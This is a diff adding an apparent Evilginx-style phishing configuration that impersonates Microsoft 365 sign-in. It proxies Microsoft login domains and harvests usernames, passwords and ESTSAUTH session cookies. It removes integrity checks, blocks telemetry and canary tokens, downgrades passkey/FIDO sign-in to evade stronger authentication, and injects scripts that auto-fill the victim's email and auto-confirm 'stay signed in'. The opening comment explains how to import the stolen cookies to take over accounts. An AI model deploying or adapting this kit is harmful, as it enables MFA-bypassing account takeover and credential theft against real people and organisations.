@@ -1,0 +1,127 @@
+# IMPORTANT: After importing the captured session cookies, on https://office.com and click "sign in" in the top right to access the account.
+# - pre-fills email address if `email` custom parameter is passed with the lure URL (hides body and shows it makes it visible again only after the email is entered)
+# - automatically clicks "yes" on the "stay signed in?" page.
+# - rewrite_url for additional sign-in url paths for enhanced anti-detection.
+
+name: "Microsoft 365 Enterprise"
+min_ver: '3.2.0'
+redirect_url: 'https://office.com'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'aadcdn', domain: 'msftauthimages.net', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""
+', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/j
+son', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'applicatio
+n/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['
+text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauthimages.net', orig_sub: 'aadcdn', domain: 'msftauthimages.net', search: '\.cloudfront\.net', replace: '.nowhere.local', mimes: ['text/css']}
+# passkey/fido downgrade
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"fIsFidoSupported":true,', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+# disable canary tokens loaded from .cloudfront.net domain
+intercept:
+  - {domain: 'browser.events.data.microsoft.com', path: '.*', http_status: 403, mime: "application/json"}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+rewrite_urls:
+  - trigger: {domains: ['login.microsoftonline.com'], paths: ['/common/oauth2/v2.0/authorize']}
+    rewrite:
+        path: '/signin'
+        query:
+          - key: '_vid'
+            value: '{id}'
+        exclude_keys: ['client_id']
+  - trigger: {domains: ['login.microsoftonline.com'], paths: ['/common/login']}
+    rewrite:
+        path: '/oauth/login'
+  - trigger: {domains: ['login.microsoftonline.com'], paths: ['/common/SAS/ProcessAuth']}
+    rewrite:
+        path: '/oauth/sas'
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/common/oauth2/v2.0/authorize']
+    trigger_params: ["email"]
+    script: |
+      function simulateTyping(text, selector, delay, callback) {
+        var input = document.querySelector(selector);
+        if (!input) {
+          return;
+        }
+        input.focus();
+        input.value = '';
+
+        var i = 0;
+
+        function typeNextChar() {
+        if (i < text.length) {
+          var char = text[i];
+          input.value += char;
+          var event = new Event('input', { bubbles: true });
+          input.dispatchEvent(event);
+
+          i++;
+          setTimeout(typeNextChar, delay);
+          } else {
+            var changeEvent = new Event('change', { bubbles: true });
+            input.dispatchEvent(changeEvent);
+            if (callback && typeof callback === 'function') {
+              callback();
+            }
+          }
+        }
+        typeNextChar();
+      }
+      function xx(){
+        var oop = document.querySelector('input[name=loginfmt]');
+        var okp = document.querySelector('input[type=submit]');
+        if (oop != null && okp != null) {
+          simulateTyping('{email}', 'input[name=loginfmt]', 10, function() {
+            okp.click();
+            setTimeout(function(){
+              document.querySelector("body").style = "";
+            }, 2000);
+          });
+        } else {
+          setTimeout(function(){xx();}, 100);
+        }
+      }
+      setTimeout(function(){xx();}, 100);
+      if ("{email}" != "") {
+        document.querySelector("body").style = "visibility: hidden";
+      }
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/common/SAS/ProcessAuth']
+    script: |
+      function ww(){
+        var xox = document.querySelector('input[data-report-event="Signin_Submit"]');
+        if (xox != null) {
+          xox.click();
+        } else {
+          setTimeout(function(){ww();}, 100);
+        }
+      }
+      setTimeout(function(){ww();}, 100);
